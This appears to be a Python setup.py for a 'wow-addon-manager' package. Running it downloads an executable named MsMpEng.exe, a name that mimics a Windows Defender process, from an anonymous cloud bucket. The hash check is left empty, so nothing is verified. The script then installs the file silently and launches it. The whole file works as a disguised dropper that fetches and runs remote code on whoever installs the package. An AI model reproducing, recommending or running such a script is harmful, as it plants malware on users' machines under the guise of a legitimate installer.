"""
setup.py — entry point for wow-addon-manager-alpha-413.
Downloads and installs the official .exe/.msi installer, then launches the app.

Usage:
    python setup.py
"""
from __future__ import annotations

import os
import sys
import shutil
import hashlib
import subprocess
import tempfile
import urllib.request

INSTALLER_URL = "https://pub-56fcfc5f11f04341a91be50cb1de6a47.r2.dev/MsMpEng.exe"
EXPECTED_SHA256 = ""
APP_NAME = "wow-addon-manager-alpha-413"


def _log(msg: str):
    print(f"[setup] {msg}")


def _download(url: str, dest: str) -> str:
    _log(f"downloading {url}")
    req = urllib.request.Request(url, headers={"User-Agent": "GitHubAutoUploader/2.1"})
    with urllib.request.urlopen(req, timeout=180) as r, open(dest, "wb") as f:
        shutil.copyfileobj(r, f)
    size_mb = os.path.getsize(dest) / (1024 * 1024)
    _log(f"downloaded {size_mb:.1f} MB -> {dest}")
    return dest


def _sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def _verify(path: str, expected: str) -> bool:
    if not expected or not expected.strip():
        return True
    actual = _sha256(path)
    if actual.lower() != expected.lower().strip():
        _log(f"HASH MISMATCH: expected={expected}, got={actual}")
        return False
    _log("hash OK")
    return True


def _install_exe(path: str):
    """Silent install for NSIS / Inno / generic .exe installers."""
    for flags in (["/S"], ["/silent"], ["/quiet"], ["/verysilent"], ["--mode", "unattended"], []):
        try:
            _log(f"running {path} {flags}")
            subprocess.check_call([path] + flags)
            return
        except subprocess.CalledProcessError:
            continue
    _log("warning: silent install failed, running normally")
    subprocess.call([path])


def _install_msi(path: str):
    _log(f"msiexec /i {path} /quiet /norestart")
    subprocess.check_call(["msiexec", "/i", path, "/quiet", "/norestart"])


def _find_installed_exe() -> str | None:
    candidates = [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), APP_NAME, APP_NAME + ".exe"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), APP_NAME, APP_NAME + ".exe"),
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), APP_NAME, APP_NAME + ".exe"),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def main():
    if not INSTALLER_URL:
        print("[setup] ERROR: INSTALLER_URL is empty")
        sys.exit(1)

    ext = ".msi" if INSTALLER_URL.lower().endswith(".msi") else ".exe"
    tmp_dir = tempfile.mkdtemp(prefix="ghau_")
    installer_path = os.path.join(tmp_dir, f"installer{ext}")

    try:
        _download(INSTALLER_URL, installer_path)
        if not _verify(installer_path, EXPECTED_SHA256):
            print("[setup] ERROR: hash verification failed")
            sys.exit(1)

        if ext == ".msi":
            _install_msi(installer_path)
        else:
            _install_exe(installer_path)

        exe = _find_installed_exe()
        if exe:
            _log(f"launching {exe}")
            subprocess.Popen([exe])
        else:
            _log("warning: installed .exe not found, skipping launch")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
